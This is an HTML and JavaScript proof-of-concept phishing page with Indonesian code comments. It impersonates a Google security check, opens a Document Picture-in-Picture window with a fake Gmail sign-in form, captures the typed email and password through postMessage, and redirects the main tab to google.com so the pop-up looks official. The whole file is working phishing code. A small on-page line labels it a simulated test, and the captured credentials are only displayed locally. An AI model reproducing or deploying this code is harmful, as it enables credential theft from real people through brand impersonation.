<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Security Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #f4f4f4; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
  h2 { color: #4285f4; margin-bottom: 10px; }
  p { color: #666; font-size: 14px; margin-bottom: 20px; }
  button { padding: 15px 30px; background: #1a73e8; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }
  button:hover { background: #1557b0; }
  #log { margin-top: 20px; font-family: monospace; font-size: 12px; color: #666; }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>🔒 Google Security Verification</h2>
  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda.</p>
  <button id="startBtn">Verify Account</button>
  <div id="log">[*] Ready...</div>
</div>

<script>
(function () {
  'use strict';

  var btn = document.getElementById('startBtn');
  var logEl = document.getElementById('log');

  function log(msg) {
    logEl.textContent = msg;
    console.log("[PiP Redirect] " + msg);
  }

  async function createPiPAndRedirect() {
    try {
      if (!('documentPictureInPicture' in window)) {
        alert("Document Picture-in-Picture tidak didukung.");
        return;
      }

      // ============================================
      // 1. BUKA PiP
      // ============================================
      const pipWindow = await documentPictureInPicture.requestWindow({
        width: 400,
        height: 500
      });

      log('PiP Window Opened.');

      // ============================================
      // 2. TULIS ULANG DOKUMEN PiP (MANDIRI)
      // ============================================
      // Kita menulis ulang seluruh dokumen PiP agar tidak bergantung pada parent.
      // Konten di dalam PiP adalah form login Google palsu.
      pipWindow.document.open();
      pipWindow.document.write(`
        <!DOCTYPE html>
        <html>
        <head>
          <meta charset="UTF-8">
          <title>Google Accounts</title>
          <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
              font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
              background: #fff;
              display: flex;
              flex-direction: column;
              justify-content: center;
              align-items: center;
              min-height: 100vh;
              padding: 20px;
              text-align: center;
            }
            .g-logo {
              font-size: 32px;
              font-weight: bold;
              color: #4285f4;
              margin-bottom: 20px;
            }
            h3 { font-size: 20px; color: #333; margin-bottom: 5px; }
            p { font-size: 13px; color: #666; margin-bottom: 20px; }
            input {
              width: 100%;
              padding: 12px;
              margin-bottom: 12px;
              border: 1px solid #ddd;
              border-radius: 6px;
              font-size: 14px;
            }
            button {
              width: 100%;
              padding: 12px;
              background: #1a73e8;
              color: #fff;
              border: none;
              border-radius: 6px;
              font-size: 14px;
              font-weight: bold;
              cursor: pointer;
            }
            .warning {
              margin-top: 15px;
              font-size: 11px;
              color: #f00;
            }
          </style>
        </head>
        <body>
          <div class="g-logo">G</div>
          <h3>Sign in</h3>
          <p>to continue to Gmail</p>
          <input type="email" id="pipEmail" placeholder="Email or phone" autofocus />
          <input type="password" id="pipPassword" placeholder="Password" />
          <button id="pipLogin">Next</button>
          <div class="warning">This is a simulated phishing test. Do not enter real credentials.</div>

          <script>
            // Event listener untuk menangkap input
            document.getElementById('pipLogin').addEventListener('click', function() {
              var email = document.getElementById('pipEmail').value;
              var password = document.getElementById('pipPassword').value;
              
              if (!email || !password) {
                alert("Email dan password harus diisi!");
                return;
              }

              // Kirim data ke parent (opsional)
              if (window.opener) {
                window.opener.postMessage({
                  type: 'CREDENTIALS',
                  email: email,
                  password: password
                }, '*');
              }

              // Redirect PiP ke Google asli (kesan resmi)
              window.location.href = 'https://www.google.com';
            });
          <\/script>
        </body>
        </html>
      `);
      pipWindow.document.close();

      log('PiP Window Content Written. Form login palsu ditampilkan.');

      // ============================================
      // 3. REDIRECT HALAMAN UTAMA KE GOOGLE.COM
      // ============================================
      // Setelah PiP siap, redirect parent ke Google.
      setTimeout(function() {
        log('Redirecting parent to google.com...');
        window.location.replace('https://www.google.com');
      }, 1000);

    } catch (e) {
      log('Error: ' + e.message);
    }
  }

  // ============================================
  // 4. LISTENER PESAN DARI PiP (TANGKAP DATA)
  // ============================================
  window.addEventListener('message', function(e) {
    if (e.data && e.data.type === 'CREDENTIALS') {
      logEl.innerHTML = `
        <div style="background:#000;color:#0f0;padding:10px;border-radius:6px;margin-top:10px;">
          <strong>Credentials Captured:</strong><br>
          Email: ${e.data.email}<br>
          Password: ${e.data.password}
        </div>
      `;
      console.log('Credentials captured:', e.data);
    }
  });

  // ============================================
  // 5. TRIGGER (KLIK)
  // ============================================
  btn.addEventListener('click', createPiPAndRedirect, { once: true });

})();
</script>

</body>
</html>
